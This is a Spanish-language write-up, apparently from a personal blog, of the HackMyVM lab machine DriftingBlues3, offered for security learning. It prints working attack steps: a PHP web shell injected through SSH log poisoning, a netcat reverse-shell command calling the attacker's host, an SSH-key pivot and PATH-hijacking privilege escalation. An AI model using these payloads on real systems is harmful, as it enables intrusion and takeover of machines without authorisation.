---
layout: single
title: DriftingBlues3 - HackMyVM
excerpt: "DriftingBlues3 es máquina Linux creada por tasiyanci. En esta máquina veremos como conseguir el acceso al sistema usando un método
que personalmente me gusta mucho, el método se llama log poisoning. Una vez dentro del sistema pivotaremos de usuario creando una llave rsa. Conseguiremos elevar privilegios con un binario SUID y usando una técnica llamada path hijacking."
date: 2021-12-16
classes: wide
header:
  teaser: /assets/images/hmvm-DriftingBlues3/hmvmDrifting3.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - log poisoning
  - rce
  - path hijacking
  - tasiyanci
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 192.168.1.81

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
nmap -sCV -p 22,80 192.168.1.81 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/eventadmins
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### WEB

![](/assets/images/hmvm-DriftingBlues3/web.png)

En el escaneo con nmap ha encontrado el fichero robots y un directorio.

![](/assets/images/hmvm-DriftingBlues3/nmapscan.png)

Visito el nuevo directorio y dentro encuentro un archivo.html.

![](/assets/images/hmvm-DriftingBlues3/eventadmins.png)

Inspecciono el código fuente del archivo.html.

![](/assets/images/hmvm-DriftingBlues3/littlequeenofspades.png)

Decodifico la cadena en base64.
```bash
echo 'aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==' | base64 -d
intruder? L2FkbWluc2ZpeGl0LnBocA==
```

Vuelvo a decodificar la nueva cadena y descubro un fichero.php.
```bash
echo 'L2FkbWluc2ZpeGl0LnBocA==' | base64 -d                        
/adminsfixit.php
```

Visito adminsfixit.php y veo un log de ssh.

![](/assets/images/hmvm-DriftingBlues3/adminsfixit.png)

### SSH Log Poisoning
Al ser un log ssh intento inyectar código malicioso.
```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.81 -i ~/.ssh/id_rsa
```

Compruebo con el navegador si se ha inyectado correctamente.
```url
view-source:http://192.168.1.81/adminsfixit.php?cmd=ls
```

![](/assets/images/hmvm-DriftingBlues3/testInyeccionsh.png)

Pongo un netcat a la escucha.
```bash
nc -lvnp 4444
```

Lanzo la petición desde mi navegador.
```bash
view-source:http://192.168.1.81/adminsfixit.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.1.38%204444%20%3E%2Ftmp%2Ff
```

Una vez obtenida la shell hago un tratamiento de la tty para tener una shell funcional.
```bash
script /dev/null -c bash
[ctrl + Z]
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

Lanzo un `ls -la` en directorio de robertj y veo que otros tienes permisos de lectura, escritura y ejecución

![](/assets/images/hmvm-DriftingBlues3/robertSSH.png)

Voy a generar una llave rsa para conectarme con el usuario robertj.
```bash
www-data@driftingblues:/home/robertj/.ssh$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/var/www/.ssh/id_rsa): /home/robertj/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/robertj/.ssh/id_rsa.
Your public key has been saved in /home/robertj/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:icaPWYzOwKGKL/pBGv91vyKP+VnuHdy2vbh5kfpPEPk www-data@driftingblues
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|               . |
|    .         o  |
|   o o + .     o |
|. o o = S     . E|
|.*   = =   . . + |
|+ o   * o . o + o|
|.. o ..+.= . +o= |
|ooo . o++o=..+=o=|
+----[SHA256]-----+
www-data@driftingblues:/home/robertj/.ssh$ cat id_rsa.pub > authorized_keys
```

Clave rsa generada.

![](/assets/images/hmvm-DriftingBlues3/llvae_rsa.png)

Copio la llave rsa a mi equipo, le doy permisos.

```bash
chmod 600 id_rsa
```

Me conecto por ssh usando la llave rsa.

```bash
ssh -i id_rsa robertj@192.168.1.81
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
robertj@driftingblues:~$
```

Ya puedo leer la flag de user.
```bash
robertj@driftingblues:~$ cat user.txt 
4*****************************0
```

Enumero el sistema en busca de binarios SUID.

![](/assets/images/hmvm-DriftingBlues3/getinfo.png)

Lanzo getinfo para ver de que se trata.

![](/assets/images/hmvm-DriftingBlues3/getinfoOutput.png)

### Path Hijacking

Me desplazo al directorio /tmp, creo un fichero malicioso y exporto la carpeta tmp al PATH del sistema.
```bash
cd /tmp
echo "/bin/bash" > uname
chmod +x uname
export PATH=/tmp/:$PATH
/usr/bin/getinfo
```

Lanzo getinfo otra vez.

![](/assets/images/hmvm-DriftingBlues3/pathijackingGetinfoRoot.png)

Como root ya puedo leer la flag.

```bash
root@driftingblues:/tmp# cat /root/root.txt 
d******************************3
```
